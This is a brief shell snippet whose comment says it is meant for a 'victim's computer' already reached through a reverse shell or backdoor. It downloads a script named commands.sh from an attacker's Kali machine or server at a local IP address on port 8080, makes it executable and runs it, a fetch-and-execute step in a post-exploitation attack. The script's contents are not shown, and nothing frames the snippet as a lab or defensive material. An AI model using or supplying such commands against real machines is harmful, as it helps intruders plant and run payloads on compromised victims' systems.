# here are the commands required to download the commands.sh script and run it, they can be executed as soon as we are on the victim’s computer using a reverse shell or backdoor

# wget <IP addr kali | server>:8080/commands.sh
wget 192.168.1.100:8080/commands.sh
chmod +x commands.sh
./commands.sh
